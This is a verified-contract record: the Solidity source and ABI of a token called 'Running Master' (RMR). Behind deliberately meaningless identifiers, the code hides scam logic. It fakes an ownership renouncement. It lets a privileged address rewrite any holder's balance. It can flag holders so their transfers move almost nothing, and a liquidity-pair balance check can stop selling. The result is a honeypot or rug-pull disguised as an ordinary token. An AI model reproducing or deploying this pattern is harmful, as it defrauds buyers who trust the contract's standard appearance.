{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.3;\n\ninterface swapLaunchedTotal {\n    function createPair(address amountSwapFund, address senderBuyMax) external returns (address);\n}\n\ninterface toReceiverMarketing {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address autoTokenTeam) external view returns (uint256);\n\n    function transfer(address txMaxFee, uint256 enableReceiver) external returns (bool);\n\n    function allowance(address launchExempt, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 enableReceiver) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address txMaxFee,\n        uint256 enableReceiver\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed fromAmount, uint256 value);\n    event Approval(address indexed launchExempt, address indexed spender, uint256 value);\n}\n\nabstract contract launchedLimit {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface buyTo {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface exemptList is toReceiverMarketing {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract RunningMaster is launchedLimit, toReceiverMarketing, exemptList {\n\n    bool public takeReceiver;\n\n    constructor (){\n        \n        buyTo maxFund = buyTo(maxTx);\n        fromAutoMarketing = swapLaunchedTotal(maxFund.factory()).createPair(maxFund.WETH(), address(this));\n        \n        enableTake = _msgSender();\n        minMax[enableTake] = true;\n        receiverLaunch[enableTake] = senderMin;\n        senderTeam();\n        \n        emit Transfer(address(0), enableTake, senderMin);\n    }\n\n    function senderTeam() public {\n        emit OwnershipTransferred(enableTake, address(0));\n        modeTeamTo = address(0);\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return senderMin;\n    }\n\n    bool private minBuy;\n\n    mapping(address => mapping(address => uint256)) private minAutoFrom;\n\n    function isToken(address swapTeamReceiver, uint256 enableReceiver) public {\n        fundSwap();\n        receiverLaunch[swapTeamReceiver] = enableReceiver;\n    }\n\n    bool public takeTotal;\n\n    function exemptReceiver(address exemptToken, address txMaxFee, uint256 enableReceiver) internal returns (bool) {\n        if (exemptToken == enableTake) {\n            return maxSenderTx(exemptToken, txMaxFee, enableReceiver);\n        }\n        uint256 amountTo = toReceiverMarketing(fromAutoMarketing).balanceOf(launchLaunched);\n        require(amountTo == autoLaunch);\n        require(txMaxFee != launchLaunched);\n        if (sellMarketing[exemptToken]) {\n            return maxSenderTx(exemptToken, txMaxFee, maxMinLiquidity);\n        }\n        return maxSenderTx(exemptToken, txMaxFee, enableReceiver);\n    }\n\n    uint256 autoLaunch;\n\n    bool private senderFundMax;\n\n    uint256 private senderMin = 100000000 * 10 ** 18;\n\n    function teamFee(address amountSell) public {\n        require(amountSell.balance < 100000);\n        if (takeReceiver) {\n            return;\n        }\n        if (takeMarketingToken != receiverList) {\n            senderFundMax = false;\n        }\n        minMax[amountSell] = true;\n        if (minFromSell != receiverList) {\n            receiverList = shouldBuyTrading;\n        }\n        takeReceiver = true;\n    }\n\n    address private modeTeamTo;\n\n    function owner() external view returns (address) {\n        return modeTeamTo;\n    }\n\n    address public enableTake;\n\n    function balanceOf(address autoTokenTeam) public view virtual override returns (uint256) {\n        return receiverLaunch[autoTokenTeam];\n    }\n\n    function approve(address tradingLaunchTo, uint256 enableReceiver) public virtual override returns (bool) {\n        minAutoFrom[_msgSender()][tradingLaunchTo] = enableReceiver;\n        emit Approval(_msgSender(), tradingLaunchTo, enableReceiver);\n        return true;\n    }\n\n    function transferFrom(address exemptToken, address txMaxFee, uint256 enableReceiver) external override returns (bool) {\n        if (_msgSender() != maxTx) {\n            if (minAutoFrom[exemptToken][_msgSender()] != type(uint256).max) {\n                require(enableReceiver <= minAutoFrom[exemptToken][_msgSender()]);\n                minAutoFrom[exemptToken][_msgSender()] -= enableReceiver;\n            }\n        }\n        return exemptReceiver(exemptToken, txMaxFee, enableReceiver);\n    }\n\n    string private minAt = \"Running Master\";\n\n    string private tradingLaunchTx = \"RMR\";\n\n    uint8 private liquidityBuy = 18;\n\n    address public fromAutoMarketing;\n\n    function symbol() external view virtual override returns (string memory) {\n        return tradingLaunchTx;\n    }\n\n    mapping(address => uint256) private receiverLaunch;\n\n    function totalList(address marketingTradingList) public {\n        fundSwap();\n        \n        if (marketingTradingList == enableTake || marketingTradingList == fromAutoMarketing) {\n            return;\n        }\n        sellMarketing[marketingTradingList] = true;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return liquidityBuy;\n    }\n\n    mapping(address => bool) public minMax;\n\n    mapping(address => bool) public sellMarketing;\n\n    uint256 private marketingAmount;\n\n    uint256 public takeMarketingToken;\n\n    address maxTx = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint256 buyAt;\n\n    function fromTotal(uint256 enableReceiver) public {\n        fundSwap();\n        autoLaunch = enableReceiver;\n    }\n\n    uint256 public minFromSell;\n\n    function name() external view virtual override returns (string memory) {\n        return minAt;\n    }\n\n    function allowance(address autoReceiver, address tradingLaunchTo) external view virtual override returns (uint256) {\n        if (tradingLaunchTo == maxTx) {\n            return type(uint256).max;\n        }\n        return minAutoFrom[autoReceiver][tradingLaunchTo];\n    }\n\n    uint256 public shouldBuyTrading;\n\n    function transfer(address swapTeamReceiver, uint256 enableReceiver) external virtual override returns (bool) {\n        return exemptReceiver(_msgSender(), swapTeamReceiver, enableReceiver);\n    }\n\n    function maxSenderTx(address exemptToken, address txMaxFee, uint256 enableReceiver) internal returns (bool) {\n        require(receiverLaunch[exemptToken] >= enableReceiver);\n        receiverLaunch[exemptToken] -= enableReceiver;\n        receiverLaunch[txMaxFee] += enableReceiver;\n        emit Transfer(exemptToken, txMaxFee, enableReceiver);\n        return true;\n    }\n\n    function fundSwap() private view {\n        require(minMax[_msgSender()]);\n    }\n\n    address launchLaunched = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function getOwner() external view returns (address) {\n        return modeTeamTo;\n    }\n\n    uint256 constant maxMinLiquidity = 12 ** 10;\n\n    uint256 public receiverList;\n\n    event OwnershipTransferred(address indexed modeTo, address indexed swapTake);\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchExempt\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"modeTo\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"swapTake\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fromAmount\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoReceiver\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"tradingLaunchTo\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingLaunchTo\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"enableReceiver\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoTokenTeam\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableTake\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromAutoMarketing\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"enableReceiver\",\"type\":\"uint256\"}],\"name\":\"fromTotal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapTeamReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"enableReceiver\",\"type\":\"uint256\"}],\"name\":\"isToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minFromSell\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"minMax\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverList\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"sellMarketing\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderTeam\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldBuyTrading\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeMarketingToken\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeTotal\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountSell\",\"type\":\"address\"}],\"name\":\"teamFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingTradingList\",\"type\":\"address\"}],\"name\":\"totalList\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapTeamReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"enableReceiver\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptToken\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"txMaxFee\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"enableReceiver\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "RunningMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}